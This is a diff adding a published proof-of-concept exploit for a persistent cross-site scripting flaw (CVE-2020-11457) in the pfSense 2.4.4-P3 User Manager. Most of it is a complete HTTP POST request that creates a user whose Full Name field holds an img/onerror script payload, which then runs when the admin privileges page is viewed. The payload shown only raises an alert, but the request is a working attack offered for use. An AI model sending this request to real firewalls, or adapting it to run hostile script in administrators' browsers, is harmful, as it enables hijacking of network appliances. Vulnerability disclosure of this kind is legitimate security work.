@@ -1,0 +1,39 @@
+# Exploit Title: pfSense 2.4.4-P3 - 'User Manager' Persistent Cross-Site Scripting
+# Date: 2020-04-02
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://www.pfsense.org
+# Version: PfSense 2.4.4-P3
+# Tested on: FreeBSD 11.2-RELEASE-p10
+# CVE : CVE-2020-11457
+
+# Vulnerability Details
+# Description :  A persistent cross-site scripting vulnerability exists within the 'User Manager' functionality of the pfSense administration panel.
+# Vulnerable Parameter : descr 
+
+
+# POC
+# Exploit Details : The following request will create a user in the 'User Manager' functionality with an XSS payload as the Full Name.  
+# This payload can be triggered by navigating to "https://TARGET/system_usermanager_addprivs.php?userid=0" where userid is 
+# the id of the user containing the payload.
+
+
+POST /system_usermanager.php?act=new HTTP/1.1
+Host: TARGET
+Connection: close
+Content-Length: 410
+Cache-Control: max-age=0
+Origin: https://TARGET
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Sec-Fetch-Dest: document
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Referer: https://TARGET/system_usermanager.php?act=new
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=ebd302521a887cef99f517e3ac6bdd7d
+
+__csrf_magic=sid%3A3689bbf23a3350994d7543c082fc36d16397208d%2C1585881631&usernamefld=TEST&passwordfld1=password&passwordfld2=password&descr=%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&expires=&webguicss=pfSense.css&webguifixedmenu=&webguihostnamemenu=&dashboardcolumns=2&name=&caref=5e643dcfd524e&keylen=2048&lifetime=3650&authorizedkeys=&ipsecpsk=&act=&userid=&privid=&certid=&utype=user&oldusername=&save=Save
